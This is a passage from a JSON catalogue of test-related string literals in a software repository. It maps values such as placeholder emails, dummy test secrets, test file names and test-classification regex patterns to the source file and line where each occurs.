        "scripts/analyze_test_overlap.py:578",
        "scripts/analyze_test_overlap.py:591",
        "scripts/analyze_test_overlap.py:606"
      ]
    },
    "test123": {
      "value": "test123",
      "category": "test_literals",
      "locations": [
        "auth_service/debug_db_test.py:56"
      ]
    },
    "test123456": {
      "value": "test123456",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:49"
      ]
    },
    "test1_category": {
      "value": "test1_category",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:625"
      ]
    },
    "test1_complexity": {
      "value": "test1_complexity",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:638"
      ]
    },
    "test1_file": {
      "value": "test1_file",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:623"
      ]
    },
    "test1_lines": {
      "value": "test1_lines",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:636"
      ]
    },
    "test1_name": {
      "value": "test1_name",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:624"
      ]
    },
    "test2": {
      "value": "test2",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:371",
        "scripts/analyze_test_overlap.py:425",
        "scripts/analyze_test_overlap.py:578",
        "scripts/analyze_test_overlap.py:592",
        "scripts/analyze_test_overlap.py:607"
      ]
    },
    "test2_category": {
      "value": "test2_category",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:628"
      ]
    },
    "test2_complexity": {
      "value": "test2_complexity",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:639"
      ]
    },
    "test2_file": {
      "value": "test2_file",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:626"
      ]
    },
    "test2_lines": {
      "value": "test2_lines",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:637"
      ]
    },
    "test2_name": {
      "value": "test2_name",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:627"
      ]
    },
    "test:failover:health": {
      "value": "test:failover:health",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:59"
      ]
    },
    "test:key": {
      "value": "test:key",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:94",
        "auth_service/tests/integration/test_redis_connection_failover.py:97",
        "auth_service/tests/integration/test_redis_connection_failover.py:100",
        "auth_service/tests/integration/test_redis_connection_failover.py:103"
      ]
    },
    "test@example.com": {
      "value": "test@example.com",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/conftest.py:157",
        "auth_service/tests/integration/test_auth_database_connection.py:38",
        "auth_service/tests/integration/test_auth_database_connection.py:44",
        "auth_service/tests/integration/test_auth_oauth_errors.py:54",
        "auth_service/tests/integration/test_auth_oauth_google.py:47",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:254",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:440",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:462",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:490",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:520"
      ]
    },
    "test@gmail.com": {
      "value": "test@gmail.com",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_oauth_id_token_validation.py:43",
        "auth_service/tests/test_oauth_id_token_validation.py:74"
      ]
    },
    "test@netrasystems.ai": {
      "value": "test@netrasystems.ai",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unified/test_jwt_validation.py:44",
        "scripts/test_cold_start_e2e.py:48"
      ]
    },
    "test@tempmail.com": {
      "value": "test@tempmail.com",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:661"
      ]
    },
    "test\\s*\\(\\s*[\\'\"]([^\\'\"]*)[\\'\"]": {
      "value": "test\\s*\\(\\s*[\\'\"]([^\\'\"]*)[\\'\"]",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:420"
      ]
    },
    "test_": {
      "value": "test_",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/factory_status/metrics_test_coverage.py:116",
        "netra_backend/app/services/factory_status/test_coverage_calculator.py:121",
        "scripts/analyze_test_overlap.py:98",
        "scripts/analyze_test_overlap.py:123",
        "scripts/auto_fix_test_sizes.py:103",
        "scripts/auto_fix_test_sizes.py:448",
        "scripts/auto_fix_test_violations.py:106",
        "scripts/auto_fix_test_violations.py:183",
        "scripts/autonomous_review/test_generator.py:34",
        "scripts/autonomous_review/test_generator.py:86"
      ]
    },
    "test_(\\w+)_": {
      "value": "test_(\\w+)_",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:527"
      ]
    },
    "test_*.py": {
      "value": "test_*.py",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:70",
        "scripts/align_test_imports.py:75",
        "scripts/autonomous_review/test_reviewer.py:139",
        "scripts/autonomous_review/test_reviewer.py:221",
        "scripts/check_test_import_order.py:65",
        "scripts/compliance/test_limits_checker.py:56",
        "scripts/compliance/test_size_validator.py:143",
        "scripts/fix_test_import_order.py:90",
        "scripts/fix_test_utils_imports.py:76",
        "scripts/remove_duplicate_test_setup.py:51"
      ]
    },
    "test_.*?(\\w+)_\\w+$": {
      "value": "test_.*?(\\w+)_\\w+$",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:528"
      ]
    },
    "test_.*_e2e|e2e_test_|TestE2E|test_end_to_end": {
      "value": "test_.*_e2e|e2e_test_|TestE2E|test_end_to_end",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:86"
      ]
    },
    "test_.*_integration|integration_test_|TestIntegration": {
      "value": "test_.*_integration|integration_test_|TestIntegration",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:85"
      ]
    },
    "test_.*_load|load_test_|TestLoad": {
      "value": "test_.*_load|load_test_|TestLoad",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:90"
      ]
    },
    "test_.*_performance|performance_test_|TestPerformance|test_.*_perf": {
      "value": "test_.*_performance|performance_test_|TestPerformance|test_.*_perf",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:88"
      ]
    },
    "test_.*_real_llm|real_llm_test_|with_real_llm|@real_llm|@pytest\\.mark\\.real_llm": {
      "value": "test_.*_real_llm|real_llm_test_|with_real_llm|@real_llm|@pytest\\.mark\\.real_llm",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:87"
      ]
    },
    "test_.*_security|security_test_|TestSecurity": {
      "value": "test_.*_security|security_test_|TestSecurity",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:89"
      ]
    },
    "test_.*_unit|unit_test_|TestUnit": {
      "value": "test_.*_unit|unit_test_|TestUnit",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:84"
      ]
    },
    "test_access_token": {
      "value": "test_access_token",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_mixins.py:180",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:928",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1175",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1219",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1266",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1316"
      ]
    },
    "test_agent": {
      "value": "test_agent",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/agents/test_agent_initialization.py:51"
      ]
    },
    "test_auth_code_": {
      "value": "test_auth_code_",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:146"
      ]
    },
    "test_auth_code_123": {
      "value": "test_auth_code_123",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:203"
      ]
    },
    "test_auth_code_12345": {
      "value": "test_auth_code_12345",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:126"
      ]
    },
    "test_auth_service": {
      "value": "test_auth_service",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/database/test_config.py:101"
      ]
    },
    "test_backend": {
      "value": "test_backend",
      "category": "test_literals",
      "locations": [
        "scripts/cleanup_test_processes.py:80"
      ]
    },
    "test_categories.py": {
      "value": "test_categories.py",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:204"
      ]
    },
    "test_categorization.json": {
      "value": "test_categorization.json",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:20"
      ]
    },
    "test_challenge": {
      "value": "test_challenge",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_pkce_validation.py:186"
      ]
    },
    "test_client_id": {
      "value": "test_client_id",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1489",
        "auth_service/tests/integration/test_oauth_state_csrf_vulnerability.py:46",
        "auth_service/tests/integration/test_oauth_state_csrf_vulnerability.py:93"
      ]
    },
    "test_client_secret": {
      "value": "test_client_secret",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_state_csrf_vulnerability.py:94"
      ]
    },
    "test_code": {
      "value": "test_code",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1465"
      ]
    },
    "test_code_manager1": {
      "value": "test_code_manager1",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:230"
      ]
    },
    "test_code_manager2": {
      "value": "test_code_manager2",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:231"
      ]
    },
    "test_config.py": {
      "value": "test_config.py",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:215",
        "scripts/align_test_imports.py:233"
      ]
    },
    "test_configs": {
      "value": "test_configs",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:66",
        "scripts/generate_test_audit.py:92",
        "scripts/generate_test_audit.py:190",
        "scripts/generate_test_audit.py:210",
        "scripts/generate_test_audit.py:211"
      ]
    },
    "test_connection": {
      "value": "test_connection",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_connection_validation.py:330",
        "auth_service/tests/test_database_connection_validation.py:360",
        "auth_service/tests/test_postgres_compliance.py:236"
      ]
    },
    "test_count": {
      "value": "test_count",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:209",
        "scripts/test_backend_optimized.py:234",
        "scripts/test_backend_optimized.py:267",
        "scripts/test_backend_optimized.py:334"
      ]
    },
    "test_details": {
      "value": "test_details",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:211"
      ]
    },
    "test_dir": {
      "value": "test_dir",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:163",
        "scripts/unified_test_config.py:172",
        "scripts/unified_test_config.py:181",
        "scripts/unified_test_config.py:341",
        "scripts/unified_test_config.py:396",
        "scripts/unified_test_config.py:407",
        "scripts/unified_test_config.py:408",
        "scripts/unified_test_runner.py:82",
        "scripts/unified_test_runner.py:88",
        "scripts/unified_test_runner.py:94"
      ]
    },
    "test_directories": {
      "value": "test_directories",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:63",
        "scripts/generate_test_audit.py:76",
        "scripts/generate_test_audit.py:147",
        "scripts/generate_test_audit.py:189",
        "scripts/generate_test_audit.py:197",
        "scripts/generate_test_audit.py:226",
        "scripts/generate_test_audit.py:282"
      ]
    },
    "test_discovery.py": {
      "value": "test_discovery.py",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:314",
        "scripts/align_test_imports.py:338"
      ]
    },
    "test_env": {
      "value": "test_env",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_base.py:41"
      ]
    },
    "test_failures": {
      "value": "test_failures",
      "category": "test_literals",
      "locations": [
        "scripts/team_updates_test_analyzer.py:28"
      ]
    },
    "test_file": {
      "value": "test_file",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:255"
      ]
    },
    "test_file_size": {
      "value": "test_file_size",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_checker.py:42",
        "scripts/compliance/test_limits_checker.py:108",
        "scripts/compliance/test_violations_reporter.py:30"
      ]
    },
    "test_fix_results_": {
      "value": "test_fix_results_",
      "category": "test_literals",
      "locations": [
        "scripts/iterative_test_fix_loop.py:22"
      ]
    },
    "test_framework": {
      "value": "test_framework",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:32",
        "scripts/align_test_imports.py:215",
        "scripts/align_test_imports.py:314",
        "scripts/business_value_test_index.py:123",
        "scripts/compliance/test_size_validator.py:131",
        "scripts/generate_test_audit.py:121",
        "scripts/standardize_l3_test_names.py:58",
        "scripts/unified_test_config.py:14",
        "scripts/unified_test_runner.py:63"
      ]
    },
    "test_framework.test_runner": {
      "value": "test_framework.test_runner",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging.py:54"
      ]
    },
    "test_framework_size": {
      "value": "test_framework_size",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:117",
        "scripts/generate_test_audit.py:124",
        "scripts/generate_test_audit.py:161"
      ]
    },
    "test_frameworks": {
      "value": "test_frameworks",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:68"
      ]
    },
    "test_frontend": {
      "value": "test_frontend",
      "category": "test_literals",
      "locations": [
        "scripts/cleanup_test_processes.py:80"
      ]
    },
    "test_function_complexity": {
      "value": "test_function_complexity",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_checker.py:44",
        "scripts/compliance/test_limits_checker.py:150",
        "scripts/compliance/test_violations_reporter.py:31"
      ]
    },
    "test_google_client_id": {
      "value": "test_google_client_id",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/conftest.py:30",
        "auth_service/tests/test_setup.py:47"
      ]
    },
    "test_google_client_secret": {
      "value": "test_google_client_secret",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/conftest.py:31"
      ]
    },
    "test_history.json": {
      "value": "test_history.json",
      "category": "test_literals",
      "locations": [
        "scripts/team_updates_test_analyzer.py:18"
      ]
    },
    "test_integration": {
      "value": "test_integration",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/project_test_validator.py:264",
        "scripts/compliance/real_test_validator.py:226"
      ]
    },
    "test_jwt_secret_key_for_testing_purposes": {
      "value": "test_jwt_secret_key_for_testing_purposes",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_generation.py:38"
      ]
    },
    "test_jwt_secret_key_for_validation_testing": {
      "value": "test_jwt_secret_key_for_validation_testing",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_validation.py:38"
      ]
    },
    "test_jwt_secret_key_that_is_long_enough_for_testing_purposes": {
      "value": "test_jwt_secret_key_that_is_long_enough_for_testing_purposes",
      "category": "test_literals",
      "locations": [
        "auth_service/debug_db_test.py:11",
        "auth_service/tests/conftest.py:29"
      ]
    },
    "test_message": {
      "value": "test_message",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:52",
        "scripts/test_cold_start_e2e.py:348"
      ]
    },
    "test_methods": {
      "value": "test_methods",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:330"
      ]
    },
    "test_metrics": {
      "value": "test_metrics",
      "category": "test_literals",
      "locations": [
        "scripts/team_updates_test_analyzer.py:30"
      ]
    },
    "test_overlap_report.json": {
      "value": "test_overlap_report.json",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:498"
      ]
    },
    "test_overlap_report.md": {
      "value": "test_overlap_report.md",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:506"
      ]
    },
    "test_password": {
      "value": "test_password",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:54",
        "auth_service/tests/test_critical_staging_database_failures.py:112",
        "auth_service/tests/unit/test_oauth_models.py:45",
        "auth_service/tests/unit/test_oauth_models.py:49",
        "auth_service/tests/unit/test_oauth_models.py:79"
      ]
    },
    "test_password_123": {
      "value": "test_password_123",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:26"
      ]
    },
    "test_priority": {
      "value": "test_priority",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:185"
      ]
    },
    "test_realistic_data_integration.py": {
      "value": "test_realistic_data_integration.py",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:206"
      ]
    },
    "test_refresh": {
      "value": "test_refresh",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:135",
        "auth_service/tests/test_security.py:432"
      ]
    },
    "test_refresh_token": {
      "value": "test_refresh_token",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_mixins.py:181"
      ]
    },
    "test_report_": {
      "value": "test_report_",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:684"
      ]
    },
    "test_reports": {
      "value": "test_reports",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:415",
        "scripts/analyze_test_overlap.py:498",
        "scripts/analyze_test_overlap.py:506",
        "scripts/analyze_test_overlap.py:511",
        "scripts/business_value_test_index.py:573",
        "scripts/business_value_test_index.py:719",
        "scripts/comprehensive_test_fixer.py:349",
        "scripts/comprehensive_test_fixer.py:404",
        "scripts/fix_test_batch.py:207",
        "scripts/fix_test_batch.py:349"
      ]
    },
    "test_reports/real_test_violations.json": {
      "value": "test_reports/real_test_violations.json",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:596"
      ]
    },
    "test_results": {
      "value": "test_results",
      "category": "test_literals",
      "locations": [
        "scripts/real_service_test_metrics.py:26",
        "scripts/real_service_test_metrics.py:76",
        "scripts/real_service_test_metrics.py:130",
        "scripts/real_service_test_metrics.py:131",
        "scripts/real_service_test_metrics.py:194"
      ]
    },
    "test_results.json": {
      "value": "test_results.json",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:573",
        "scripts/test_example_message_flow.py:133"
      ]
    },
    "test_results_100_iterations.json": {
      "value": "test_results_100_iterations.json",
      "category": "test_literals",
      "locations": [
        "scripts/batch_fix_and_test.py:137"
      ]
    },
    "test_run_123": {
      "value": "test_run_123",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/agents/test_agent_initialization.py:118"
      ]
    },
    "test_runner": {
      "value": "test_runner",
      "category": "test_literals",
      "locations": [
        "scripts/cleanup_test_processes.py:80"
      ]
    },
    "test_runners": {
      "value": "test_runners",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:65",
        "scripts/generate_test_audit.py:86",
        "scripts/generate_test_audit.py:191",
        "scripts/generate_test_audit.py:213",
        "scripts/generate_test_audit.py:214"
      ]
    },
    "test_secret": {
      "value": "test_secret",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1001",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1004",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1009",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1052",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1055",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1063"
      ]
    },
    "test_secret_for_id_tokens": {
      "value": "test_secret_for_id_tokens",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_oauth_id_token_validation.py:36"
      ]
    },
    "test_secret_key_that_is_long_enough_for_security": {
      "value": "test_secret_key_that_is_long_enough_for_security",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:26"
      ]
    },
    "test_service": {
      "value": "test_service",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:129",
        "scripts/test_coordination_fixes.py:132",
        "scripts/test_coordination_fixes.py:135",
        "scripts/test_coordination_fixes.py:136",
        "scripts/test_coordination_fixes.py:139",
        "scripts/test_coordination_fixes.py:140",
        "scripts/test_coordination_fixes.py:143",
        "scripts/test_coordination_fixes.py:147"
      ]
    },
    "test_service_secret_key": {
      "value": "test_service_secret_key",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_token_generation.py:39",
        "auth_service/tests/test_auth_token_validation.py:39"
      ]
    },
    "test_session": {
      "value": "test_session",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_state_security.py:66",
        "auth_service/tests/unit/test_oauth_state_security.py:73",
        "auth_service/tests/unit/test_oauth_state_security.py:78",
        "auth_service/tests/unit/test_oauth_state_security.py:101",
        "auth_service/tests/unit/test_oauth_state_security.py:104",
        "auth_service/tests/unit/test_oauth_state_security.py:112",
        "auth_service/tests/unit/test_oauth_state_security.py:119",
        "auth_service/tests/unit/test_oauth_state_security.py:122",
        "auth_service/tests/unit/test_oauth_state_security.py:125",
        "auth_service/tests/unit/test_oauth_state_security.py:210"
      ]
    },
    "test_session_": {
      "value": "test_session_",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:143",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:180",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:844"
      ]
    },
    "test_session_123": {
      "value": "test_session_123",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:202",
        "auth_service/tests/integration/test_auth_oauth_errors.py:279",
        "auth_service/tests/integration/test_auth_oauth_errors.py:359",
        "auth_service/tests/integration/test_auth_oauth_errors.py:402",
        "auth_service/tests/integration/test_oauth_state_csrf_vulnerability.py:49",
        "auth_service/tests/unit/test_oauth_state_security.py:148"
      ]
    },
    "test_session_456": {
      "value": "test_session_456",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_state_csrf_vulnerability.py:135"
      ]
    },
    "test_session_collision": {
      "value": "test_session_collision",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_state_csrf_vulnerability.py:200"
      ]
    },
    "test_session_expiry": {
      "value": "test_session_expiry",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_state_csrf_vulnerability.py:179"
      ]
    },
    "test_similarities.csv": {
      "value": "test_similarities.csv",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:511"
      ]
    },
    "test_size_compliance_examples.py": {
      "value": "test_size_compliance_examples.py",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:28",
        "scripts/compliance/demo_test_size_enforcement.py:142"
      ]
    },
    "test_size_violations.json": {
      "value": "test_size_violations.json",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:601"
      ]
    },
    "test_state": {
      "value": "test_state",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:120",
        "auth_service/tests/integration/test_auth_oauth_errors.py:124",
        "auth_service/tests/integration/test_auth_oauth_errors.py:128",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:1466"
      ]
    },
    "test_status": {
      "value": "test_status",
      "category": "test_literals",
      "locations": [
        "scripts/team_updates_test_analyzer.py:27"
      ]
    },
    "test_token": {
      "value": "test_token",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:134",
        "auth_service/tests/test_security.py:431"
      ]
    },
    "test_type_distribution": {
      "value": "test_type_distribution",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:628"
      ]
    },
    "test_update_spec.xml": {
      "value": "test_update_spec.xml",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:24"
      ]
    },
    "test_user": {
      "value": "test_user",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:53",
        "auth_service/tests/test_critical_staging_database_failures.py:111",
        "scripts/test_cold_start_e2e.py:47",
        "scripts/test_cold_start_e2e.py:232",
        "scripts/test_cold_start_e2e.py:233",
        "scripts/test_cold_start_e2e.py:244",
        "scripts/test_example_message_flow.py:290",
        "scripts/test_ssl_certificates_staging.py:129"
      ]
    },
    "test_user_123": {
      "value": "test_user_123",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/conftest.py:156",
        "auth_service/tests/integration/test_auth_database_connection.py:37",
        "auth_service/tests/integration/test_auth_database_connection.py:43",
        "auth_service/tests/integration/test_auth_oauth_errors.py:53",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:253",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:439",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:489",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:711",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:827",
        "auth_service/tests/integration/test_oauth_comprehensive_failures.py:884"
      ]
    },
    "test_user_creation.py (80 lines)\n- test_user_creation_valid_data()\n- test_user_creation_invalid_email()\n- test_user_creation_duplicate_email()\n\ntest_user_authentication.py (85 lines)  \n- test_authenticate_valid_credentials()\n- test_authenticate_invalid_password()\n- test_authenticate_nonexistent_user()\n\ntest_user_permissions.py (90 lines)\n- test_user_default_permissions()\n- test_admin_permissions()\n- test_permission_inheritance()\n\ntest_user_profile.py (70 lines)\n- test_profile_update()\n- test_profile_validation()\n- test_profile_privacy()\n\ntest_user_helpers.py (50 lines)\n- create_test_user()\n- create_admin_user()\n- get_test_auth_token()": {
      "value": "test_user_creation.py (80 lines)\n- test_user_creation_valid_data()\n- test_user_creation_invalid_email()\n- test_user_creation_duplicate_email()\n\ntest_user_authentication.py (85 lines)  \n- test_authenticate_valid_credentials()\n- test_authenticate_invalid_password()\n- test_authenticate_nonexistent_user()\n\ntest_user_permissions.py (90 lines)\n- test_user_default_permissions()\n- test_admin_permissions()\n- test_permission_inheritance()\n\ntest_user_profile.py (70 lines)\n- test_profile_update()\n- test_profile_validation()\n- test_profile_privacy()\n\ntest_user_helpers.py (50 lines)\n- create_test_user()\n- create_admin_user()\n- get_test_auth_token()",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_limits_examples.py:77"
      ]
    },
    "test_utils": {
      "value": "test_utils",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_import_order.py:39",
        "scripts/fix_test_import_order.py:32"
      ]
    },
    "test_utils.py": {
      "value": "test_utils.py",
      "category": "test_literals",
      "locations": [
        "scripts/remove_duplicate_test_setup.py:55"
      ]
    },
    "test_verifier": {
      "value": "test_verifier",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_pkce_validation.py:186"
      ]
    },
    "test_violations_report.md": {
      "value": "test_violations_report.md",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:982"
      ]
    },
    "testcontainers": {
      "value": "testcontainers",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:375"
      ]
    },
    "testing": {
      "value": "testing",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:78",
        "scripts/test_backend.py:78",
        "scripts/test_backend.py:368",
        "scripts/unified_test_runner.py:206"
      ]
    },
    "testpass": {
      "value": "testpass",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:147",
        "auth_service/tests/test_security.py:257",
        "auth_service/tests/test_security.py:292",
        "auth_service/tests/test_security.py:359",
        "auth_service/tests/test_security.py:409",
        "auth_service/tests/test_security.py:460",
        "auth_service/tests/test_security.py:511",
        "auth_service/tests/test_security.py:553"
      ]
    },
    "tests": {
      "value": "tests",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:31",
        "scripts/auto_fix_test_violations.py:91",
        "scripts/auto_fix_test_violations.py:92",
        "scripts/auto_fix_test_violations.py:93",
        "scripts/auto_fix_test_violations.py:94",
        "scripts/autonomous_review/test_generator.py:32",
        "scripts/autonomous_review/test_generator.py:86",
        "scripts/autonomous_review/test_generator.py:88",
        "scripts/autonomous_review/test_generator.py:89",
        "scripts/autonomous_review/test_reviewer.py:309"
      ]
    },
    "tests\u001b[0m": {
      "value": "tests\u001b[0m",
      "category": "test_literals",
      "locations": [
        "scripts/test_discovery_report.py:118"
      ]
    },
    "tests failed": {
      "value": "tests failed",
      "category": "test_literals",
      "locations": [
        "scripts/test_failure_scanner.py:177"
      ]
    },
    "tests passed": {
      "value": "tests passed",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/agents/test_agent_initialization.py:209",
        "auth_service/test_staging_db_connection.py:316",
        "auth_service/test_url_construction.py:237",
        "scripts/test_failure_scanner.py:180",
        "scripts/test_verify_workflow_status.py:223",
        "scripts/test_verify_workflow_status_corrected.py:211"
      ]
    },
    "tests passed (": {
      "value": "tests passed (",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status_corrected.py:246"
      ]
    },
    "tests timed out after": {
      "value": "tests timed out after",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:470"
      ]
    },
    "tests to test suite": {
      "value": "tests to test suite",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:240"
      ]
    },
    "tests without validation": {
      "value": "tests without validation",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:177"
      ]
    },
    "tests)": {
      "value": "tests)",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:711",
        "scripts/fix_test_batch.py:240"
      ]
    },
    "tests)\u001b[0m -": {
      "value": "tests)\u001b[0m -",
      "category": "test_literals",
      "locations": [
        "scripts/test_discovery_report.py:106"
      ]
    },
    "tests) -": {
      "value": "tests) -",
      "category": "test_literals",
      "locations": [
        "scripts/test_discovery_report.py:108"
      ]
    },
    "tests, avg score:": {
